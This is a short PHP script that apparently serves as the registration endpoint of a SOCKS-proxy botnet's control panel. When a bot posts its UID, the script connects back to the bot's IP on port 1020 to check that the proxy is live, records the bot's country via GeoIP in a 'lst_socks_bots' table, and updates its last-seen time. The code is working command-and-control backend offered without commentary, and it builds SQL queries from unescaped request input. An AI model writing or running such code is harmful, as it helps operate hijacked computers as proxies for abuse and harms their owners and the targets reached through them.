<?php
include("./inc/config.php");
include("./inc/funcs.php");
include("./geoip.inc");

$handle = geoip_open("GeoIP.dat", GEOIP_STANDARD);
if (isset($_POST['mode']))
{
    if ($_POST['mode'] == 1) {
        $sql = "SELECT `ID` FROM `lst_socks_bots` WHERE `UID` = '".dRead("UID")."';";
        $res = mysql_query($sql);
        if (mysql_num_rows($res) < 1) {
            $server  = $_SERVER['REMOTE_ADDR'];
            $port   = "1020";
            $timeout = "5";
            $connectsock =  @fsockopen("$server", $port, $errno, $errstr, $timeout);
            if(!$connectsock) 
            {
                echo "ERR";
                die("");
            }
            $strCountryCode = geoip_country_name_by_addr($handle, $_SERVER['REMOTE_ADDR']);
            if ($strCountryCode  == "")
            {
                $strCountryCode  = "fam";
            }
            else
            {
                $strCountryCode = strtolower($strCountryCode);
            }
            $sql = "INSERT INTO `lst_socks_bots` (`ID`, `UID`, `countrycode`, `IP`,`lasttime`) VALUES (NULL, '".dRead("UID")."', '".$strCountryCode."','".$_SERVER['REMOTE_ADDR']."', '".time()."');";
            mysql_query($sql);
        }
        else
        {
            $sql = "UPDATE `lst_socks_bots` SET `lasttime` = '".time()."' WHERE `UID` = '".dRead("UID")."';";
			$res = mysql_query($sql);
        }
    }
}		
geoip_close($handle);
die("");
?>
